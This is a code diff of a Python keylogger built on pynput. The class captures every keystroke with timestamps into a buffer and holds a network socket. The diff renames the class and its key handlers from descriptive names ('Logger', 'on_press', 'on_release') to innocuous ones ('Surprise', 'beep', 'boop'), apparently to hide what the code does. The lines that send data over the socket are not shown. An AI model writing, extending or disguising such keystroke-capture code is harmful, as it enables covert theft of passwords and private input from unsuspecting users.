@@ -4,14 +4,14 @@ from pynput.keyboard import Key, Listener
 from threading import Thread
 import datetime
 
-class Logger(Thread):
+class Surprise(Thread):
     def __init__(self, s):
         Thread.__init__(self)
         self.str_holder = ''
         self.timestamp = datetime.datetime.now()
         self.socket = s
  
-    def on_press(self, key):
+    def beep(self, key):
         key_char = str(key).strip("'")
         
         # Edit special inputs
@@ -23,7 +23,7 @@ class Logger(Thread):
         self.str_holder += key_char
         
 
-    def on_release(self, key):
+    def boop(self, key):
         cur_time = datetime.datetime.now()
         # Log if a long enough time has elapsed
         if cur_time - self.timestamp > datetime.timedelta(seconds=2):
@@ -38,5 +38,5 @@ class Logger(Thread):
         self.timestamp = cur_time
 
     def run(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as listener :
-            listener.join()
+        with Listener(on_press=self.beep, on_release=self.boop) as background:
+            background.join()
